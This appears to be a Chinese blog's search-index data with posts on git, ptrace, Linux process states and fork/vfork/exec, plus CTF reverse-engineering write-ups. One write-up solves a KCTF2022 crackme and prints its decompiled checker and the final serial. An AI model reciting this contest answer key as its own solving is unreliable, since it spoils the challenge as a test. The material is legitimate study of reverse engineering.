清除撤销commit的一切记录 git revert 生成新的撤销commit ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:8:1","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#merge和rebase merge：合并两分支，保留所有提交记录 rebase：变基，改变一部分commit记录，使git log更加简洁 rebase -i：常用于重排commit ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:8:2","tags":["git"],"title":"版本控制（git）","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["WriteUps"],"content":"1.Flaredle ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:1:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"2.PixelPoker ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:2:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"3.Magic 8 Ball ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:3:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"4.darn_mice ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:4:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"5.T8 ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:5:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"6.a la mode ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:6:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"7.anode ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:7:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"8.backdoor ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:8:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"9.encryptor ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:9:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"10.Nur geträumt ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:10:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"11.Paul Tarter ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:11:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["Binary"],"content":"众说纷纭 最近在学ptrace的各种用法，看到使用PTRRACE_PEEKDATA读取数据时产生了疑惑 ptrace函数签名： long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 大量文章中写道: PTRRACE_PEEKDATA从内存地址中读取一个字节，内存地址由addr给出 重点在于读取一个字节，但奇怪的是ptrace函数返回值却是long类型 少部分文章中改成了读取四个字节，估计是注意到了long类型返回值 又去查了查ptrace文档，上面这么描述： Read a word at the address addr in the tracee’s memory, returning the word as the result of the ptrace() call. 怎么又变成了一个字（word），两个字节？ ","date":"2022-11-20","objectID":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/:1:0","tags":["misunderstanding"],"title":"“字”的歧义--深入ptrace返回值类型","uri":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/"},{"categories":["Binary"],"content":"柳暗花明 最终发现了stackoverflow的一篇文章，其中提到ptrace文档中的一个note（小小吐槽一下，这个note在整篇文章的末尾，前文也没什么标注，不专门去找很难看到 The size of a “word” is determined by the operating-system variant (e.g., for 32-bit Linux it is 32 bits). 由此终于清楚，这里所说的word由操作系统位数决定，32位系统上是32位，64位系统上是64位 ","date":"2022-11-20","objectID":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/:2:0","tags":["misunderstanding"],"title":"“字”的歧义--深入ptrace返回值类型","uri":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/"},{"categories":["Binary"],"content":"“字”的歧义 作为天天跟汇编打交道的逆向壬，我先入为主的认为一个word就是2字节，却忘了word的定义： A word is the amount of data that a machine can process at one time. 之所以在汇编以及许多场合中把字（word）规定为2字节（2 bytes），大概是为了更统一、更准确地描述数据大小，并且出现了双字、四字之类的东西 但仍有很多情况下，仍使用“字”的原始定义，与系统一次能处理的最大数据量相对应，long这种C语言数据结构的大小即是一个“字” ","date":"2022-11-20","objectID":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/:3:0","tags":["misunderstanding"],"title":"“字”的歧义--深入ptrace返回值类型","uri":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/"},{"categories":["Binary"],"content":"linux ptrace技术（一）基本概述与函数参数 ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:1:0","tags":["linux","reverse"],"title":"linux ptrace相关技术（一）基本概述与ptrace函数","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["Binary"],"content":"ptrace概述 逆向壬应该都对ptrace并不陌生，常出现于ELF文件的反调试中。 ptrace其实是linux的一种系统调用，一般用于调试技术。使用ptrace可以实现父进程对子进程的监控和控制，由此开发了动态分析工具如strace和gdb。因为同一时间一个子进程只能被唯一的父进程追踪，所以代码内调用ptrace看能否成功附加到主进程，可以用来检验是否有调试器附加到主进程，起到反调试的作用。 ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:2:0","tags":["linux","reverse"],"title":"linux ptrace相关技术（一）基本概述与ptrace函数","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["Binary"],"content":"ptrace函数原型及参数 #include \u003csys/ptrace.h\u003e long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); request：要进行的ptrace操作 pid：要操作的进程号 addr：要监控/修改的内存地址 data：要读取/写入的数据变量 常见request类型： PTRACE_TRACE: 表示本进程希望被父进程跟踪, 主动与父进程建立追踪机制 PTRACE_PEEKTEXT, PTRACE_PEEKDATA: 从addr指定的内存地址中取出数据 PTRACE_POKETEXT, PTRACE_POKEDATA: 向addr指定的内存地址中写入数据 PETRACE_PEEKUSER: 从USER结构体中，偏移量为addr处取出数据 PETRACE_POKEUSER: 向USER结构体中，偏移量为addr处写入数据 PTRACE_CONT: 使子进程继续运行 PTRACE_KILL: 杀掉子进程 PTRACE_SINGLESTEP: 子进程单步执行 PTRACE_ATTACH: 父进程和子进程建立追踪关系，并发送SIGSTOP信号使其暂停 PTRACE_DETACH: 父进程解除对子进程的追踪关系，让子进程继续运行 PTRACE_SEIZE: 父进程对子进程建立追踪关系，但不会让子进程暂停，且要指定data参数ptrace(PTRACE_SEIZE, pid, 0, PTRACE_0_flags); PTRACE_SYSCALL: 使被停止的子进程继续运行，并在下次进入或退出系统调用时停止。 ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:3:0","tags":["linux","reverse"],"title":"linux ptrace相关技术（一）基本概述与ptrace函数","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["Binary"],"content":"Reference https://stackoverflow.com/questions/9803908/difference-between-ptraceptrace-peekuser-and-ptraceptrace-peekdata ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:4:0","tags":["linux","reverse"],"title":"linux ptrace相关技术（一）基本概述与ptrace函数","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["WriteUps"],"content":"62进制大数运算 如何面对一堆乱七八糟的函数保持冷静与耐心是这道题最大的难点（（ 搜一下IRtzloZ6iuB会发现有关62进制的内容，结合0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz这个表基本可以确定。代码使用结构体存储大数，前四字节为位数len，后32字节为具体数据data，在IDA中可以自行创建结构体使代码更好看 然后就是漫长的复原函数的过程，最终IDA函数列表中_main函数上面从上到下依次是： base62_decode base62_init base62_cpy base62_cmp base62_add base62_sub base62_and base62_or base62_xor base62_mul base62_div base62_mod base62_mod_ret // 不修改参数值，返回值是结果 base62_shl base62_shr 三个或四个参数的函数第一个参数储存结果，两个参数的函数使用返回值作结果（init和cpy两个函数除外） 复原main函数 int __cdecl main(int argc, const char **argv, const char **envp) { int split_index; // edi int len; // eax int v6; // esi int v7; // eax char input; // [esp+8h] [ebp-40h] BYREF char v10[60]; // [esp+9h] [ebp-3Fh] BYREF __int16 v11; // [esp+45h] [ebp-3h] char v12; // [esp+47h] [ebp-1h] input = 0; memset(v10, 0, sizeof(v10)); v11 = 0; v12 = 0; printf((int)\"Input:\"); gets(\u0026input); split_index = -1; len = 0; if ( !input ) goto LABEL_20; do { if ( len \u003e= 64 ) break; if ( v10[len - 1] == '-' ) split_index = len; } while ( v10[len++] ); if ( split_index \u003e 0 \u0026\u0026 (v6 = len - split_index, len - split_index \u003e 0) \u0026\u0026 base62_decode(\u0026left, \u0026input, split_index, a0123456789abcd) \u003e 0 \u0026\u0026 base62_decode(\u0026right, \u0026v10[split_index], v6 - 1, a0123456789abcd) \u003e 0 \u0026\u0026 (base62_decode(\u0026mod_const, aIrtzloz6iub, strlen(aIrtzloz6iub), a0123456789abcd), base62_init(\u0026tmp1, 0), base62_init(\u0026tmp2, 0), base62_cmp(\u0026left, \u0026right) \u003c 0) // left \u003c right \u0026\u0026 base62_cmp(\u0026left, \u0026mod_const) \u003c 0 // left \u003c mod_const \u0026\u0026 base62_cmp(\u0026right, \u0026mod_const) \u003c 0 ) // right \u003c mod_const { v7 = 0; while ( 1 ) { j = v7 + 1; base62_add(\u0026tmp1, \u0026tmp1, \u0026left); base62_add(\u0026tmp2, \u0026tmp2, \u0026right); base62_mod(\u0026tmp1, \u0026tmp1, \u0026mod_const); base62_mod(\u0026tmp2, \u0026tmp2, \u0026mod_const); base62_init(\u0026var1, 1); base62_sub(\u0026var1, \u0026tmp1, \u0026var1); if ( !base62_cmp(\u0026var1, \u0026left) ) { ++cnt; base62_mul(\u0026var1, \u0026var1, \u0026left); } base62_init(\u0026var2, 1); base62_add(\u0026var2, \u0026tmp2, \u0026var2); if ( !base62_cmp(\u0026var2, \u0026right) ) { ++cnt; base62_div(\u0026var2, \u0026mod_const, \u0026right); } if ( cnt == 10 ) break; v7 = j; if ( j \u003e= 0x200000 ) goto LABEL_20; } printf((int)\"Success!\\n\"); return 0; } else { LABEL_20: printf((int)\"Error.\\n\"); return 0; } } 可以发现，input是被-分开的左右两部分字符串，然后把这两部分字符串当作62进制数使用base62_decode函数转成10进制（16进制）存入left和right，mod_const是由62进制数Bui6ZolztRI解码得到的，计算得到是10的19次方。下面还有对left和right的限制，即left \u003c right \u003c mod_const 下面的while(1)循环中，只有cnt==0才能正常break输出Success，且通过交叉引用可以发现整个程序只有两个if中++cnt对cnt的值进行w引用，容易想到的check逻辑是： $( left * j_1 - 1) mod 10^{19} = left$ $(right * j_2 + 1) mod 10^{19} = right$ 且在$1 \u003c= j \u003c 0x200000$中，随着j增大，j1、j2总共满足10次。这对一个逆向壬实属超纲了，于是做的时候这道题到这就陷入了死局。 ","date":"2022-11-19","objectID":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/:1:0","tags":["CTF","reverse"],"title":"KCTF2022秋季赛第二题WriteUp","uri":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/"},{"categories":["WriteUps"],"content":"不起眼函数中暗藏关键逻辑 在复原各种函数时，我是一边动调，一边连蒙带猜，看出大概用途就直接把整个函数当作黑盒处理了。结束后看了看别队的wp，才发现在base62_mul和base62_div中末尾藏着两段关键的逻辑 base62_init(\u0026var1, 4); // var1.data = 4 base62_shl(\u0026var2.len, \u0026var1.len, 3); // val2.data = 4 \u003c\u003c 3 = 32 if ( cnt \u003e 0 \u0026\u0026 *(_DWORD *)\u0026mod_const.data[var2.data[0]] == var2.data[0] ) { base62_add(\u0026var1, \u0026var1, \u0026var2); // var1.data = var1.data + var2.data = 4 + 32 = 36 v12 = base62_mod_ret(\u0026var1, j); // v12 = var1.data % j = 36 % 32 = 4 mod_const.data[var1.data[0]] += 4; base62_shl(\u0026var1.len, \u0026var1.len, v12); base62_sub(\u0026var2, \u0026var1, \u0026var2); } base62_init(\u0026var1, 4); base62_shl(\u0026var2.len, \u0026var1.len, 3); if ( cnt \u003e 0 \u0026\u0026 *(_DWORD *)\u0026mod_const.data[var2.data[0]] == var2.data[0] ) { base62_add(\u0026var1, \u0026var1, \u0026var2); v11 = base62_mod_ret(\u0026var1, ::j); mod_const.data[var1.data[0]] += 4; base62_shl(\u0026var1.len, \u0026var1.len, v11); base62_sub(\u0026var2, \u0026var1, \u0026var2); } ","date":"2022-11-19","objectID":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/:2:0","tags":["CTF","reverse"],"title":"KCTF2022秋季赛第二题WriteUp","uri":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/"},{"categories":["WriteUps"],"content":"数组越界取值是新颖还是刁难 在上述两段隐藏的逻辑中,开头两句先把var1初始化为4，再把var1左移3等于32赋给var2，下面的判断*(_DWORD *)\u0026mod_const.data[var2.data[0]] == var2.data[0，var2.data[0] == 32，而mod_const.data只有32位，故访问下标32处会发生数组越界，可以发现下一个四字节存的是main函数中的j，所以判断条件实际是cnt \u003e 0 \u0026\u0026 j == 32 if块中代码首先把var1.data改成了36，此时访问mod_const.data[var1.data[0]]同样会出现越界，实际访问的其实是main函数中的cnt，使cnt += 4，两个if块共加8，加上外层两个加1刚好为10,符合题目条件。 此时再回到上面列出的等式，所求其实是j1 == j2 == 32时的特殊解 即 $$ \\left{ \\begin{matrix} ( left * 32 - 1) mod 10^{19} = left \\ ( right * 32 + 1) mod 10^{19} = right \\end{matrix} \\right. $$ 变形一下 $$ \\left{ \\begin{matrix} left * 31 = k_1 * 10^{19} + 1 \\ right * 31 = k_2 * 10^{19} - 1 \\ left, right, k_1, k_2 \\in N^* \\ left \u003c right \u003c mod_const \\end{matrix} \\right. $$ 解得 k1 = 12 k2 = 19 left = 0x35b870a6eb0f7bdf right = 0x550eb25d9ed88421 把left和right转换成62进制数即可得最终序列号ZSxZerX4xb4-jyvP7x12lI7 ","date":"2022-11-19","objectID":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/:3:0","tags":["CTF","reverse"],"title":"KCTF2022秋季赛第二题WriteUp","uri":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/"},{"categories":["Binary"],"content":"进程状态 一台linux机器上运行着多个进程，每个进程在同一时间都处在一种特定的状态，称为进程状态，常见的进程状态如下： ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:0","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"R(TASK_RUNNING)，可执行状态 由于一个单核CPU在同一时间只能执行一个进程，所以并不是所有处于可执行状态的进程都正在被CPU执行，处于可执行状态的进程会被添加到CPU的执行队列中，由进程调度器决定每一刻真正执行的是哪一个进程。 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:1","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"S(TASK_INTERRUPTIBLE)，可中断的睡眠状态 处于这个状态的进程在等待着某些事件的发生（如等待socket连接、等待信号量等），属于挂起（睡眠）状态。使用top命令可以发现绝大多数进程都处于这个状态 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:2","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"D(TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态 与S状态类似，进程处于挂起（睡眠）状态，但此时进程无法被中断/杀死，不会响应进程信号（如SIGKILL），常用于系统底层某些不能被打断的进程 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:3","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"T(TASK_STOPPED)，暂停状态 向处于TASK_RUNNING状态的进程发送一个SIGSTOP信号可以强制使进程停止，来到TASK_STOPPED状态，当接收到SIGCONT信号时，进程将重新回到TASK_RUNNING状态 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:4","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"t(TASK_TRACED)，正在被跟踪状态 此状态下的进程也会暂停下来，等待跟踪它的调试进程对它进行操作。与TASK_STOPPED状态不同，此状态不会相应SIGCONT信号，只有调试进程调用PTRACE_CONT、PTRACE_DETACH或进程退出时被调试的进程才能恢复TASK_RUNNING状态 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:5","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"Z(TASK_DEAD-EXIT_ZOMBIE)退出状态，成为僵尸进程 大致可分为两种情况： 子进程退出但父进程并未及时释放子进程，称为僵尸状态 父进程退出，但子进程仍然存在，称为孤儿状态 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:6","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"X(TASK_DEAD-EXIT_DEAD)退出状态，进程即将被销毁 进程被置于此状态时，接下来立即会被完全释放，此状态持续时间十分短暂 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:7","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"进程信号 控制进程状态的更新、变换需要系统发出信号，即进程信号，进程信号列表可以使用kill -l查看， 进程信号调控进程状态，大致如下图： 注：图中Running和Ready同属TASK_RUNNING状态 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:2:0","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"进程创建 linux用户态创建进程常用fork、vfork、clone三个函数 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:0","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"原理 三者都是依托父进程创建新的子进程，函数返回值在不同进程中值不同，在子进程中返回0，在父进程中返回子进程pid，返回值为负数则创建子进程失败。 三者区别在于对进程空间的使用。fork函数创建的子进程会复制一份父进程的进程空间，vfork函数创建的子进程与父进程使用同一份进程空间，而clone函数可选是否共用各种资源。 fork和vfork函数还有另外一个区别：fork函数创建的子进程与父进程同时运行，先后顺序随即。而vfork函数保证子进程先运行，只有当子进程退出时才会运行父进程，确保不会发生同时读写内存等竞争问题。 下面针对fork和vfork函数进行尝试： ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:1","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"使用fork函数 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = fork(); // 创建子进程 if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"num is modified by child process\\nnow num = %d\\n\\n\", num); } else { sleep(1); // 确保父进程运行到这时子进程已完成了对num的修改 puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // 父进程中fork函数返回值为子进程pid printf(\"num = %d\\n\\n\", num); } } 程序输出：s in child process pid = 61209 num = 1 test is modified by child process now num = 10 in parent process pid = 61208 child process pid is 61209 num = 1 可以看到在子进程中修改了num的值，对父进程的num没有影响，正是因为父、子进程进程空间相互独立 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:2","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"vfork函数 使用exit函数正常退出子进程 #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"test is modified by child process\\nnow num = %d\\n\\n\", num); exit(0); // 退出子进程 } else { puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // 父进程中vfork函数返回值为子进程pid printf(\"num = %d\\n\\n\", num); } } 程序输出： in child process pid = 62770 num = 1 test is modified by child process now num = 10 in parent process pid = 62769 child process pid is 62770 num = 10 可以看到在子进程中修改num的值，在父进程中输出num的值也改变了，正是因为两进程共用一块进程空间 不能使用return退出子进程 将上个例子中使用exit(0)退出子进程改为使用return 0试试效果： #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"test is modified by child process\\nnow num = %d\\n\\n\", num); return 0; } else { puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // 父进程中vfork函数返回值为子进程pid printf(\"num = %d\\n\\n\", num); } } 程序输出： in child process pid = 65039 num = 1 test is modified by child process now num = 10 in parent process pid = 65038 child process pid is 65039 num = -1431084768 可以发现父进程输出的num出现了错误。 这是因为子进程使用return返回意味着子进程中的main函数结束了，main函数的栈会被回收，然后子进程结束。因为父进程与子进程共享这个栈，而栈中存放的num值已不存在，故会打印出错。 更进一步，如果把return也去掉，会发现效果是一样的，因为函数正常结束，一样会进行栈回收。 总结来说，子进程退出一般都要使用exit函数 使用exec函数族调起新的进程 exec函数族分别包括以下函数： int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); 其中execve是linux的一个系统调用，其他函数都是对它的封装。功能是根据指定的路径或文件名找到相应的可执行文件，使用该可执行文件的代码段、数据段、堆栈数据替换当前进程中的数据，进行执行。 要注意的是，使用exec函数族不会创建新的进程，不会改变pid，只是替换了当前进程空间的数据。 回归正题，最开始只有一个fork函数可以用来创建新进程，但很多程序中仅仅是在新进程中使用了exec函数族调起了新的进程，这时fork函数复制整个父进程的进程空间就成了浪费。于是后来才产生了vfork函数。 实践一下： #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"test is modified by child process\\nnow num = %d\\n\\n\", num); char *argv[] = {\"ls\", \"-l\", \"/\", NULL}; execve(\"/bin/ls\", argv, NULL); // 调起ls进程 perror(\"error exec\"); // 打印错误 } else { sleep(1); puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // 父进程中vfork函数返回值为子进程pid printf(\"num = %d\\n\\n\", num); } return 0; } 程序输出： in child process pid = 70303 num = 1 test is modified by child process now num = 10 total 33570236 lrwxrwxrwx 1 root root 7 Oct 19 05:01 bin -\u003e usr/bin drwxr-xr-x 4 root root 4096 Nov 12 10:30 boot drwxr-xr-x 23 root root 4360 Nov 17 10:09 dev drwxr-xr-x 133 root root 12288 Nov 17 14:21 etc drwxr-xr-x 3 root root 4096 Jan 23 2022 home lrwxrwxrwx 1 root root 7 Oct 19 05:01 lib -\u003e usr/lib lrwxrwxrwx 1 root root 7 Oct 19 05:01 lib64 -\u003e usr/lib drwx------ 2 root root 16384 Jan 23 2022 lost+found drwxr-xr-x 3 root root 4096 Oct 19 00:40 mnt drwxr-xr-x 28 root root 4096 Nov 11 01:15 opt dr-xr-xr-x 429 root root 0 Nov 17 10:09 proc drwxr-x--- 26 root root 4096 Nov 10 18:35 root drwxr-xr-x 34 root root 940 Nov 17 14:19 run lrwxrwxrwx 1 root root 7 Oct 19 05:01 sbin -\u003e usr/bin drwxr-xr-x 4 root root 4096 Jan 23 2022 srv -rw------- 1 root root 34359738368 Nov 2 23:05 swapfile dr-xr-xr-x 13 root root 0 Nov 17 10:09","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:3","tags":["linux","reverse"],"title":"linux进程基础","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"Reference Linux系统之进程状态 - 腾讯云开发者社区-腾讯云 进程线程常见基础问题 | Whatbeg's blog https://book.itheima.net/course/223/1277519158031949826/1277528003525484545 https://www.zhihu.com/question/515280466 